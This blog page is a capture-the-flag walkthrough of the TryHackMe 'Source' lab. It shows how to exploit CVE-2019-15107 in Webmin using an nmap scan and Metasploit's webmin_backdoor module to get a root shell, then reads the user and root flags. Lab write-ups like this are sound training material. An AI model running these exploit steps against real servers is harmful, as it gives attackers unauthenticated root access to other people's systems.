<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="This is an easy box on TryHackMe based on a recent Webmin exploit. Here are the steps to follow to own this box.
First, let&rsquo;s enumerate the box with nmap with nmap -p- -vv -T4 [machine ip].
This shows 2 ports open, 22 (ssh) and 10000 (typically used for webmin)
Let&rsquo;s pull up the site on port 10000 with https://[machine ip]:10000. This site is using a self signed certificate, so accept the certificate and you will be presented with a webmin login page."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Source - TryHackMe"><meta name=twitter:description content="This is an easy box on TryHackMe based on a recent Webmin exploit. Here are the steps to follow to own this box.
First, let&rsquo;s enumerate the box with nmap with nmap -p- -vv -T4 [machine ip].
This shows 2 ports open, 22 (ssh) and 10000 (typically used for webmin)
Let&rsquo;s pull up the site on port 10000 with https://[machine ip]:10000. This site is using a self signed certificate, so accept the certificate and you will be presented with a webmin login page."><meta property="og:title" content="Source - TryHackMe"><meta property="og:description" content="This is an easy box on TryHackMe based on a recent Webmin exploit. Here are the steps to follow to own this box.
First, let&rsquo;s enumerate the box with nmap with nmap -p- -vv -T4 [machine ip].
This shows 2 ports open, 22 (ssh) and 10000 (typically used for webmin)
Let&rsquo;s pull up the site on port 10000 with https://[machine ip]:10000. This site is using a self signed certificate, so accept the certificate and you will be presented with a webmin login page."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-07-11-source-walkthrough/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-07-11T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-11T00:00:00+00:00"><title>Source - TryHackMe · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-07-11-source-walkthrough/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.175a7aec05f92c17568ecad1d40a7681454de0383d6cd613f2afaf6aabfd7047.css integrity="sha256-F1p67AX5LBdWjsrR1Ap2gUVN4Dg9bNYT8q+vaqv9cEc=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.815859ce402d78e4e2074b80305c3b86578d026ab3055642afc27e110e03fac2.css integrity="sha256-gVhZzkAteOTiB0uAMFw7hleNAmqzBVZCr8J+EQ4D+sI=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-07-11-source-walkthrough/>Source - TryHackMe</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-07-11T00:00:00Z>July 11, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
2-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/source/>Source</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/webmin/>Webmin</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/cve-2019-15107/>CVE-2019-15107</a></span></div></div></header><div><p>This is an easy box on <a href=https://tryhackme.com>TryHackMe</a> based on a recent Webmin exploit. Here are the steps to follow to own this box.</p><p>First, let&rsquo;s enumerate the box with nmap with <strong>nmap -p- -vv -T4 [machine ip]</strong>.</p><p>This shows 2 ports open, 22 (ssh) and 10000 (typically used for webmin)</p><p><img src=/assets/img/Source1.png alt="Source nmap"></p><p>Let&rsquo;s pull up the site on port 10000 with <strong>https://[machine ip]:10000</strong>. This site is using a self signed certificate, so accept the certificate and you will be presented with a webmin login page. A quick Google search shows you that one of the latest CVEs for Webmin was CVE-2019-15107, which allows for remote code execution without authentication. This is because of a bug in a parameter in password_change.cgi. Let&rsquo;s launch Metasploit with <strong>msfconsole</strong> and run <strong>search webmin 1.920</strong>. One of the results will include an exploit we can use.</p><p><img src=/assets/img/Source2.png alt="Source Metasploit"></p><p>Let&rsquo;s run <strong>use exploit/linux/http/webmin_backdoor</strong> followed by <strong>show options</strong>. You should see a screen similar to the following:</p><p><img src=/assets/img/Source3.png alt="Source exploit options"></p><p>Let&rsquo;s run <strong>SET RHOSTS [machine ip]</strong>, <strong>SET SSL true</strong>, **SET LHOST [your VPN IP] **and then once set, use <strong>run</strong> to attempt the exploit.</p><p><img src=/assets/img/Source4.png alt="Source run exploit"></p><p>You should get a shell within a few moments.</p><p><img src=/assets/img/Source5.png alt="Source root shell"></p><p>Run <strong>whoami</strong> and you will see you have root access.</p><p><img src=/assets/img/Source6.png alt="Source whoami"></p><p>Let&rsquo;s upgrade our shell with <strong>python -c &lsquo;import pty; pty.spawn("/bin/sh")&rsquo;</strong>. Now, let&rsquo;s navigate to the main user home directory with <strong>cd /home</strong> and run <strong>ls</strong> to list the user directories on this server. You will see that there is a user name of <strong>dark</strong> here.</p><p><img src=/assets/img/Source7.png alt="Source enumerate user home"></p><p>Let&rsquo;s go into his directory with <strong>cd dark</strong> and run <strong>ls -al</strong> to list directory contents. You will see a <strong>user.txt</strong> file, let&rsquo;s run <strong>cat user.txt</strong> and you now have the user flag.</p><p><img src=/assets/img/Source8.png alt="Source user flag"></p><p>Next, let&rsquo;s navigate to /root with <strong>cd /root</strong> and run <strong>ls</strong>. You will see a file named root.txt. Let&rsquo;s view it&rsquo;s contents with <strong>cat root.txt</strong></p><p><img src=/assets/img/Source9.png alt="Source root flag"></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>